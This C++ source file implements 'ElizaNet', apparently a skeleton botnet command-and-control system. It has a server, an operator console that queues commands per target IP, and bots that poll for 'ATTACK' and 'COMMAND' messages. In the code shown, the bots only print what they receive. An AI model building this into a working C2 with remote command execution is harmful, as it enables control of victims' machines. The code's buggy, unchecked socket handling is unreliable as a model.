#include "elizaNet.h"

void ElizaNet::setupServer(unsigned int serverPort) {
    this->serverPort = serverPort;
    
    this->sockServer = socket(AF_INET, SOCK_STREAM, 0);
    this->server.sin_family = AF_INET;
    this->server.sin_addr.s_addr = htonl(INADDR_ANY);
    this->server.sin_port = htons(serverPort);
    bind(sockServer, (struct sockaddr*)&server, sizeof(server));
}
void ElizaNet::startServer() {
    listen(sockServer, 100);
    while(1) {
        socklen_t size = sizeof(sockaddr_in);
        this->sockClient = accept(sockServer, (struct sockaddr*)&client, &size);
        std::cout << "=== Incomming connection! ===" << std::endl;
        handleClients(this->sockClient);
    }

}
void ElizaNet::stopServer() {

}
void ElizaNet::handleClients(int sock) {
    paketcount++;
    char buf[128];
    char clientIp[16];
    socklen_t len = sizeof(client);

    read(sock, buf, sizeof(char)*128);
    ElizaPaket *fromSender = new ElizaPaket();
    ElizaPaket *response = new ElizaPaket();
    fromSender->parsePaket(std::string(buf));
    getpeername(sock, (struct sockaddr *) &client, &len);
    inet_ntop(AF_INET, &client.sin_addr, clientIp, sizeof(clientIp));

    std::cout << "\t" << "[" << paketcount << "]" << " paket from client {" << std::endl
        << "\t\tIP: " << std::string(clientIp) << std::endl
        << "\t\tSendertype: " << fromSender->getSenderType() << std::endl 
        << "\t\tMessagetype: " << fromSender->getMessageType() << std::endl
        << "\t\tMessage: " << fromSender->getMessage() << std::endl
        << "\t}" << std::endl << std::endl;

    if(fromSender->getSenderType() == "HEAD") {
        response = this->handleHead(fromSender);
        
    }
    else if(fromSender->getSenderType() == "BOT") {
        response = this->handleBot(fromSender, std::string(clientIp));
    }
    write(sock, (char *)response->toString().c_str(), strlen((char *)response->toString().c_str()));
    close(sock);
}

void ElizaNet::setupBot(std::string serverIp, unsigned int serverPort) {
    this->serverPort = serverPort;
    this->server.sin_family = AF_INET;
    this->server.sin_addr.s_addr = inet_addr(serverIp.c_str());
    this->server.sin_port = htons(serverPort);
}
void ElizaNet::startBot() {
    while(1) {
        this->sockClient = socket(AF_INET, SOCK_STREAM, 0);
        connect(sockClient, (struct sockaddr*)&server, sizeof(server));
        ElizaPaket *toserver = new ElizaPaket();
        ElizaPaket *fromserver = new ElizaPaket();
        char buf[1024];

        toserver->createPaket(SenderType::BOT, MessageType::STATUS, "WHATSGOINGON?");
        send(sockClient,  toserver->toString().c_str(), strlen(toserver->toString().c_str()), 0);
        read(sockClient, buf, 1024);
        fromserver->parsePaket(std::string(buf));
        if(fromserver->getMessageType() == "ATTACK") {
            std::cout << "Attack Signal recieved!!!!" << std::endl << "Target is " << fromserver->getMessage() << std::endl;
        }
        else if(fromserver->getMessageType() == "COMMAND") {
            std::cout << "Command recieved! " << fromserver->getMessage() << std::endl;
        }
        else {
            std::cout << fromserver->toString() << std::endl;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(5000));
        delete toserver;
        delete fromserver; 
    }
}

void ElizaNet::setupHead(std::string serverIp, unsigned int serverPort) {
    this->serverPort = serverPort;
    this->server.sin_family = AF_INET;
    this->server.sin_addr.s_addr = inet_addr(serverIp.c_str());
    this->server.sin_port = htons(serverPort);
}
void ElizaNet::startHead() {
    while(1) {
        
        ElizaPaket *toserver = new ElizaPaket();
        ElizaPaket *fromserver = new ElizaPaket();
        char buf[1024];

        std::string input;
        std::cin >> input;

        if(input == "sendcommand") {
            std::string target;
            std::cin >> target;
            std::string command;
            std::cin >> command;
            std::string snd = target + ":" + command + ":";

            toserver->createPaket(SenderType::HEAD, MessageType::COMMAND, snd);
        }

        this->sockClient = socket(AF_INET, SOCK_STREAM, 0);
        connect(sockClient, (struct sockaddr*)&server, sizeof(server));
        send(sockClient,  toserver->toString().c_str(), strlen(toserver->toString().c_str()), 0);
        read(sockClient, buf, 1024);
        fromserver->parsePaket(std::string(buf));
        std::cout << fromserver->toString() << std::endl;
        delete toserver;
        delete fromserver; 
    }
}

std::vector<std::string> ElizaNet::split(std::string s, std::string delimiter) {
    std::vector<std::string> splitVec;
    size_t pos = 0;
    std::string token;
    while ((pos = s.find(delimiter)) != std::string::npos) {
        token = s.substr(0, pos);
        splitVec.push_back(token);
        s.erase(0, pos + delimiter.length());
    }
    return splitVec;
}

ElizaPaket* ElizaNet::handleHead(ElizaPaket* fromServer) {
    ElizaPaket* response = new ElizaPaket();
    if(fromServer->getMessageType() == "COMMAND") {
        std::vector<std::string> cmd = this->split(fromServer->getMessage(), ":");
        this->targetIp = cmd[0];
        this->targetCommand = cmd[1];
        this->commandMap[targetIp] = targetCommand;
        response->createPaket(SenderType::SERVER, MessageType::GENERIC, "RECIEVED"); 
    }
    return response;
}
ElizaPaket* ElizaNet::handleBot(ElizaPaket* fromServer, std::string clientIp) {
    ElizaPaket* response = new ElizaPaket();
    if(fromServer->getMessageType() == "STATUS") {
        if(this->targetDefined == true) {
            response->createPaket(SenderType::SERVER, MessageType::ATTACK, targetIp);        
        }
        else if(this->commandMap.count(std::string(clientIp)) == 1) {
            response->createPaket(SenderType::SERVER, MessageType::COMMAND, commandMap[std::string(targetIp)]);
            this->commandMap.erase(std::string(targetIp));
        }
        else {
            response->createPaket(SenderType::SERVER, MessageType::GENERIC, "Nothing to do!");
        }
    }
    return response;
}